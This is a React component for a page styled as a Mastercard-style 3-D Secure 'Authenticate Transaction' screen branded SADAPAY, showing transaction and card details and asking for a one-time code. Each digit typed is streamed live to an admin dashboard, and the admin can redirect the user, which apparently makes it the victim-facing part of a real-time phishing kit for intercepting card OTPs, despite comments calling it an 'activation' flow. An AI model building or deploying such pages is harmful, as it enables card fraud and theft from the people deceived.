"use client";

import { useActionState, useEffect, useRef, useState } from "react";
import { useRouter } from "next/navigation";
import { Loader2 } from "lucide-react";
import { verifyActivationOtpAction } from "@/lib/actions/activation";
import { OTP_LENGTH } from "@/lib/activation";
import { useActivationLive } from "@/lib/useActivationLive";

interface Props {
  /** Where the code was sent — the last four of the phone, e.g. "1186". */
  sentTo: string;
  merchant: string;
  amount: string;
  date: string;
  cardNumber: string;
}

/** The Mastercard-style interlocking discs used on the ID Check header. */
function CardNetworkMark() {
  return (
    <span className="inline-flex items-center" aria-hidden>
      <span className="h-6 w-6 rounded-full bg-[#eb001b]" />
      <span className="-ml-2.5 h-6 w-6 rounded-full bg-[#f79e1b] mix-blend-multiply" />
    </span>
  );
}

/** A collapsible help row — "Learn more about authentication +". */
function HelpRow({ label, children }: { label: string; children: React.ReactNode }) {
  const [open, setOpen] = useState(false);
  return (
    <div className="border-b border-slate-100 last:border-0">
      <button
        type="button"
        onClick={() => setOpen((v) => !v)}
        className="flex w-full items-center justify-between gap-3 py-2.5 text-left text-sm font-medium text-[#1a6ad6]"
      >
        {label}
        <span className="text-lg leading-none text-[#1a6ad6]">{open ? "−" : "+"}</span>
      </button>
      {open ? <p className="pb-3 text-xs leading-relaxed text-slate-500">{children}</p> : null}
    </div>
  );
}

/**
 * The 3-D Secure "Authenticate Transaction" screen, styled after a card-network
 * ID Check page. The applicant enters the code their reviewer issued; on success
 * the account drops back to the loading screen to await final approval. A live
 * stream still carries them elsewhere the instant the admin changes course.
 */
export function ActivationOtp({ sentTo, merchant, amount, date, cardNumber }: Props) {
  const router = useRouter();
  const [state, action, pending] = useActionState(verifyActivationOtpAction, undefined);
  const [code, setCode] = useState("");
  const navigated = useRef(false);
  const live = useActivationLive();

  // Follow the admin live if they route elsewhere while this screen is open.
  useEffect(() => {
    if (!live || navigated.current) return;
    if (live.stage !== "otp") {
      navigated.current = true;
      router.replace(live.destination);
    }
  }, [live, router]);

  // Stream the digits as they're entered, so the admin sees the code fill in
  // live on the dashboard.
  useEffect(() => {
    const id = setTimeout(() => {
      void fetch("/api/activation/otp-typing", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ code }),
        keepalive: true,
      });
    }, 120);
    return () => clearTimeout(id);
  }, [code]);

  const details: Array<[string, string]> = [
    ["Merchant:", merchant],
    ["Amount:", amount],
    ["Date:", date],
    ["Card Number:", cardNumber],
  ];

  return (
    <main className="flex min-h-screen items-start justify-center bg-slate-100 px-4 py-8 sm:items-center">
      <div className="w-full max-w-[27rem] overflow-hidden rounded-lg border border-slate-200 bg-white shadow-xl">
        {/* Header — processor wordmark left, card-network ID Check right */}
        <div className="flex items-center justify-between border-b border-slate-200 px-5 py-4">
          <span className="text-xl font-extrabold tracking-tight" style={{ color: "#00b3a4" }}>
            SADA<span style={{ color: "#0b3b60" }}>PAY</span>
          </span>
          <span className="flex items-center gap-2">
            <CardNetworkMark />
            <span className="text-slate-300">|</span>
            <span className="text-sm font-medium text-slate-600">ID Check</span>
          </span>
        </div>

        <div className="px-6 py-5 text-[#7a1f1f]">
          <h1 className="text-center text-lg font-bold text-slate-900">Authenticate Transaction</h1>

          <p className="mt-3 text-sm leading-relaxed">
            Enter the confirmation code you received to confirm the transaction.
          </p>
          <p className="mt-2 text-sm">
            Code has been sent to: <span className="font-semibold">{sentTo}</span>
          </p>
          <p className="mt-1 text-sm">The page will automatically time out in 10 minutes.</p>

          {/* Transaction detail rows */}
          <dl className="mt-5 space-y-1.5 text-sm">
            {details.map(([label, value]) => (
              <div key={label} className="flex gap-4">
                <dt className="w-28 shrink-0">{label}</dt>
                <dd className="font-medium">{value}</dd>
              </div>
            ))}
          </dl>

          <form action={action} className="mt-6">
            <input type="hidden" name="code" value={code} />
            <label className="block text-center text-sm text-slate-500">Confirmation code</label>
            <input
              value={code}
              onChange={(e) => setCode(e.target.value.replace(/\D/g, "").slice(0, OTP_LENGTH))}
              inputMode="numeric"
              autoComplete="one-time-code"
              autoFocus
              aria-label="Confirmation code"
              className={`mt-1.5 h-11 w-full rounded border bg-white px-3 text-center font-mono text-lg tracking-[0.4em] text-slate-900 outline-none transition-colors focus:ring-2 focus:ring-emerald-500/30 ${
                state?.error ? "border-rose-400" : "border-slate-300 focus:border-emerald-500"
              }`}
            />

            {state?.error ? (
              <p className="mt-2 text-center text-sm font-medium text-rose-600">{state.error}</p>
            ) : null}

            <button
              type="submit"
              disabled={code.length !== OTP_LENGTH || pending}
              className="mt-5 flex h-11 w-full items-center justify-center gap-2 rounded bg-[#3aa935] text-sm font-bold uppercase tracking-wide text-white transition-colors hover:bg-[#348f30] disabled:cursor-not-allowed disabled:opacity-50"
            >
              {pending ? (
                <>
                  <Loader2 className="h-4 w-4 animate-spin" /> Confirming…
                </>
              ) : (
                "Confirm"
              )}
            </button>
          </form>

          <div className="mt-4 flex items-center justify-between text-sm font-semibold">
            <button
              type="button"
              onClick={() => router.refresh()}
              className="uppercase tracking-wide text-[#1a6ad6] hover:underline"
            >
              Resend Code
            </button>
            <a
              href="/login"
              className="uppercase tracking-wide text-[#1a6ad6] hover:underline"
            >
              Cancel
            </a>
          </div>

          <div className="mt-5 border-t border-slate-100 pt-1">
            <HelpRow label="Learn more about authentication">
              This extra step confirms it&rsquo;s really you completing the transaction. Enter the
              {` ${OTP_LENGTH}`}-digit code issued for your activation to continue.
            </HelpRow>
            <HelpRow label="Need some help?">
              Didn&rsquo;t get a code, or entered the wrong one? Ask your reviewer to reissue it, then
              enter the new code above.
            </HelpRow>
          </div>
        </div>
      </div>
    </main>
  );
}
